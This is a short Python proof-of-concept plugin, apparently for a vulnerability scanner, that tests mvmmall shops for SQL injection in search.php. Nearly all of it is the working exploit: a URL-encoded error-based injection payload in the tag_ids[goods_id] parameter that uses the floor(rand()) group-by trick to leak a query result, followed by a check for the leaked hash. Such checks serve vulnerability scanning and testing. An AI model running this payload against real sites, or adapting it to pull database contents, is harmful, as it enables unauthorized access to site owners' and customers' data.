# !/usr/bin/dev python
# -*- encoding:utf-8 -*-

import re
"""
reference:
http://www.wooyun.org/bugs/wooyun-2011-01732
&
http://www.beebeeto.com/pdb/poc-2015-0056/
"""


def assign(service, arg):
    if service == 'mvmmall':
        return True, arg
    pass


def audit(arg):
    verify_url = arg
    payload = """/search.php?tag_ids[goods_id]=uid))%20and(select%201%20from(select%20count(*),concat((select%20(select%20md5(12345))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20and%201=1%23"""
    verify_url += payload
    code, head, res, errcode, finalurl = curl.curl("\"%s\"" % verify_url)
    if code == 200:
        if '827ccb0eea8a706c4c34a16891f84e7b' in res:
            security_hole(verify_url)
    pass


if __name__ == "__main__":
    from dummy import *
    audit(assign('mvmmall', 'http://www.example.com/')[1])